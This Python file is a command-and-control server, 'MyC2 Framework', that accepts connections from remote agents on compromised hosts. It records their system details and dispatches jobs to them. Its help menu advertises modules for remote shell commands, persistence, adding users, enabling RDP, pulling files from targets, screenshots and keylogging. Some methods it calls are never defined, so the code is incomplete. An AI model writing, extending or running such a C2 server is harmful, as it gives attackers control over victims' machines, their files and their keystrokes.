#!/usr/bin/env python3
import socket
import threading
import json
import sqlite3
import uuid
import time
from datetime import datetime
import logging

class C2Server:
    def __init__(self, host='192.168.100.2', port=4445):
        self.host = host
        self.port = port
        self.agents = {}
        self.running = True
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('C2Server')
        
        # Initialize database
        self.init_database()
        
    def init_database(self):
        """Initialize SQLite database"""
        self.conn = sqlite3.connect('data/c2_database.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        # Create tables
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                architecture TEXT,
                os_version TEXT,
                process_name TEXT,
                internal_ip TEXT,
                external_ip TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                sleep_interval INTEGER,
                status TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS jobs (
                id TEXT PRIMARY KEY,
                agent_id TEXT,
                module_name TEXT,
                arguments TEXT,
                status TEXT,
                created_at DATETIME,
                started_at DATETIME,
                completed_at DATETIME,
                output TEXT,
                FOREIGN KEY (agent_id) REFERENCES agents (id)
            )
        ''')
        
        self.conn.commit()
        self.logger.info("Database initialized")
    
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.logger.info(f"C2 Server started on {self.host}:{self.port}")
            
            # Start listener thread
            listener_thread = threading.Thread(target=self.accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            # Start command handler
            self.command_handler()
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
    
    def accept_connections(self):
        """Accept incoming agent connections"""
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                self.logger.info(f"New connection from {addr[0]}:{addr[1]}")
                
                # Handle each agent in a separate thread
                agent_thread = threading.Thread(
                    target=self.handle_agent,
                    args=(client_socket, addr)
                )
                agent_thread.daemon = True
                agent_thread.start()
                
            except Exception as e:
                self.logger.error(f"Error accepting connection: {e}")
    
    def handle_agent(self, client_socket, addr):
        """Handle communication with a single agent"""
        agent_id = None
        
        try:
            while self.running:
                # Receive data from agent
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                
                try:
                    message = json.loads(data)
                    agent_id = message.get('agent_id')
                    message_type = message.get('type')
                    
                    if message_type == 'checkin':
                        self.handle_checkin(client_socket, message, addr)
                    elif message_type == 'job_result':
                        self.handle_job_result(message)
                    elif message_type == 'system_info':
                        self.handle_system_info(message)
                        
                except json.JSONDecodeError:
                    self.logger.error("Invalid JSON received")
                    
        except Exception as e:
            self.logger.error(f"Error handling agent {agent_id}: {e}")
        finally:
            if agent_id and agent_id in self.agents:
                del self.agents[agent_id]
                self.update_agent_status(agent_id, 'disconnected')
            client_socket.close()
    
    def handle_checkin(self, client_socket, message, addr):
        """Handle agent check-in"""
        agent_id = message['agent_id']
        system_info = message.get('system_info', {})
        
        # Register or update agent
        if agent_id not in self.agents:
            self.register_agent(agent_id, system_info, addr)
            self.logger.info(f"New agent registered: {agent_id}")
        else:
            self.update_agent_last_seen(agent_id)
        
        # Store socket for this agent
        self.agents[agent_id] = {
            'socket': client_socket,
            'last_seen': datetime.now(),
            'system_info': system_info
        }
        
        # Send pending jobs to agent
        self.send_pending_jobs(agent_id, client_socket)
    
    def register_agent(self, agent_id, system_info, addr):
        """Register a new agent in the database"""
        try:
            self.cursor.execute('''
                INSERT INTO agents (
                    id, hostname, username, architecture, os_version, 
                    process_name, internal_ip, external_ip, first_seen, 
                    last_seen, sleep_interval, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id,
                system_info.get('hostname', 'Unknown'),
                system_info.get('username', 'Unknown'),
                system_info.get('architecture', 'Unknown'),
                system_info.get('os_version', 'Unknown'),
                system_info.get('process_name', 'Unknown'),
                addr[0],
                system_info.get('external_ip', 'Unknown'),
                datetime.now(),
                datetime.now(),
                60,  # Default sleep interval
                'active'
            ))
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Error registering agent: {e}")
    
    def update_agent_last_seen(self, agent_id):
        """Update agent's last seen timestamp"""
        try:
            self.cursor.execute(
                "UPDATE agents SET last_seen = ?, status = ? WHERE id = ?",
                (datetime.now(), 'active', agent_id)
            )
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Error updating agent last seen: {e}")
    
    def update_agent_status(self, agent_id, status):
        """Update agent status"""
        try:
            self.cursor.execute(
                "UPDATE agents SET status = ? WHERE id = ?",
                (status, agent_id)
            )
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Error updating agent status: {e}")
    
    def send_pending_jobs(self, agent_id, client_socket):
        """Send pending jobs to agent"""
        try:
            self.cursor.execute(
                "SELECT id, module_name, arguments FROM jobs WHERE agent_id = ? AND status = 'pending'",
                (agent_id,)
            )
            pending_jobs = self.cursor.fetchall()
            
            for job_id, module_name, arguments in pending_jobs:
                job_message = {
                    'type': 'job',
                    'job_id': job_id,
                    'module_name': module_name,
                    'arguments': json.loads(arguments) if arguments else {}
                }
                
                # Update job status to running
                self.cursor.execute(
                    "UPDATE jobs SET status = 'running', started_at = ? WHERE id = ?",
                    (datetime.now(), job_id)
                )
                self.conn.commit()
                
                # Send job to agent
                client_socket.send(json.dumps(job_message).encode('utf-8'))
                self.logger.info(f"Sent job {job_id} to agent {agent_id}")
                
        except Exception as e:
            self.logger.error(f"Error sending jobs to agent {agent_id}: {e}")
    
    def handle_job_result(self, message):
        """Handle job result from agent"""
        try:
            job_id = message['job_id']
            output = message['output']
            success = message.get('success', True)
            
            status = 'completed' if success else 'failed'
            
            self.cursor.execute(
                "UPDATE jobs SET status = ?, completed_at = ?, output = ? WHERE id = ?",
                (status, datetime.now(), output, job_id)
            )
            self.conn.commit()
            
            self.logger.info(f"Job {job_id} {status}. Output: {output[:100]}...")
            
        except Exception as e:
            self.logger.error(f"Error handling job result: {e}")
    
    def handle_system_info(self, message):
        """Handle system information from agent"""
        # TODO: Update agent system information in database
        pass
    
    def create_job(self, agent_id, module_name, arguments=None):
        """Create a new job for an agent"""
        try:
            job_id = str(uuid.uuid4())
            
            self.cursor.execute('''
                INSERT INTO jobs (id, agent_id, module_name, arguments, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (
                job_id,
                agent_id,
                module_name,
                json.dumps(arguments) if arguments else None,
                'pending',
                datetime.now()
            ))
            self.conn.commit()
            
            self.logger.info(f"Created job {job_id} for agent {agent_id}")
            return job_id
            
        except Exception as e:
            self.logger.error(f"Error creating job: {e}")
            return None
    
    def command_handler(self):
        """Enhanced command handler with more options"""
        while self.running:
            try:
                command = input("\nC2> ").strip().lower()
                
                if command == 'exit':
                    self.shutdown()
                    break
                elif command == 'agents':
                    self.list_agents()
                elif command == 'modules':
                    self.list_modules()
                elif command == 'active':
                    self.list_active_agents()
                elif command.startswith('interact '):
                    agent_id = command.split(' ')[1]
                    self.interactive_mode(agent_id)
                elif command.startswith('jobs '):
                    parts = command.split(' ')
                    if len(parts) >= 3:
                        agent_id = parts[1]
                        module_name = parts[2]
                        args = ' '.join(parts[3:]) if len(parts) > 3 else ''
                        self.create_job(agent_id, module_name, args)
                elif command.startswith('kill '):
                    agent_id = command.split(' ')[1]
                    self.kill_agent(agent_id)
                elif command == 'help':
                    self.show_help()
                else:
                    print("Unknown command. Type 'help' for available commands.")
                    
            except Exception as e:
                self.logger.error(f"Error in command handler: {e}")

    def list_agents(self):
        """List all registered agents"""
        try:
            self.cursor.execute("SELECT id, hostname, username, internal_ip, last_seen, status FROM agents")
            agents = self.cursor.fetchall()
            
            print("\nRegistered Agents:")
            print("-" * 80)
            print(f"{'ID':<10} {'Hostname':<15} {'User':<10} {'IP':<15} {'Last Seen':<20} {'Status':<10}")
            print("-" * 80)
            
            for agent in agents:
                agent_id, hostname, username, ip, last_seen, status = agent
                print(f"{agent_id[:8]:<10} {hostname:<15} {username:<10} {ip:<15} {last_seen:<20} {status:<10}")
                
        except Exception as e:
            self.logger.error(f"Error listing agents: {e}")
    
    def show_help(self):
        """Show enhanced help menu"""
        print("\n" + "="*50)
        print("MyC2 Framework - Enhanced Commands")
        print("="*50)
        print("  agents                    - List all registered agents")
        print("  active                    - List only active agents") 
        print("  modules                   - Show available modules")
        print("  interact <agent_id>       - Enter interactive mode")
        print("  jobs <agent_id> <module>  - Create job for agent")
        print("  kill <agent_id>           - Disconnect agent")
        print("  exit                      - Shutdown server")
        print("\nAvailable Modules:")
        print("  shell <command>           - Execute shell command")
        print("  sysinfo                   - Get system information")
        print("  persistence <method>      - Establish persistence")
        print("  useradd <username> <pass> - Create new user")
        print("  rdp <enable/disable>      - Manage RDP access")
        print("  download <file>           - Download file from target")
        print("  upload <local> <remote>   - Upload file to target")
        print("  screenshot                - Capture screenshot")
        print("  keylogger <start/stop>    - Keylogging functions")
        print("  process_list              - List running processes")
        print("="*50)
    def shutdown(self):
        """Shutdown the server gracefully"""
        self.logger.info("Shutting down C2 server...")
        self.running = False
        self.server_socket.close()
        self.conn.close()

if __name__ == "__main__":
    server = C2Server()
    server.start()